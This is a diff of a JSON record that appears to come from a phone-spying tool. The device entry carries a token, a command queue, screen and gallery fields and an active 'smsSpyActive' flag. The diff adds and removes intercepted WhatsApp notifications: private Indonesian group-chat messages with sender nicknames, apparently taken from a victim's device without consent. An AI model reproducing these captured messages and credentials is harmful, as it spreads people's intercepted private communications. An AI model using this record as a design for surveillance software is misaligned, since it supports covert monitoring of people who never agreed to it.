@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777178467065,
+    "lastSeen": 1777178469467,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎411 pesan dari 2 chat",
+        "time": "26/04 12:52",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777178470819
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Pegasus-X Room (4 pesan): ~ P1",
+        "content": "📷 Gunakan !SBrat agar langsung jadi sticker.",
+        "time": "26/04 12:52",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777178470741
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (407 pesan): 📣 Menyebut Anda",
+        "content": "~ hanz: bacot lu karbit",
+        "time": "26/04 12:52",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777178470503
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3995,30 +4019,6 @@
         "time": "26/04 11:25",
         "pkg": "com.whatsapp",
         "receivedAt": 1777173249030
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (179 pesan): ~ kkeu",
-        "content": "siapa cakepbbgt",
-        "time": "26/04 11:25",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173248768
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (139 pesan): ~ petani ngawi",
-        "content": "📷 ‎1 foto",
-        "time": "26/04 11:25",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173248765
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOK AXEL 17 STR #1 (49 pesan): ~ Fluxo Cruel",
-        "content": "📷 KALIAN MAU FF KIPAS SEMUA BUNDLE ADA?\n\nMASUK AJA NANTI GW BAGI BAGI TUTOR AMA LINK BUAT DOWNLOAD NYA KALO UDH 100 MEM \n\nhttps://whatsapp.com/channel/0029Val8xlCKWEKnZGHPmM24 \n\nMASUK☝🏻",
-        "time": "26/04 11:25",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173248762
       }
     ],
     "galleryPhotos": [],
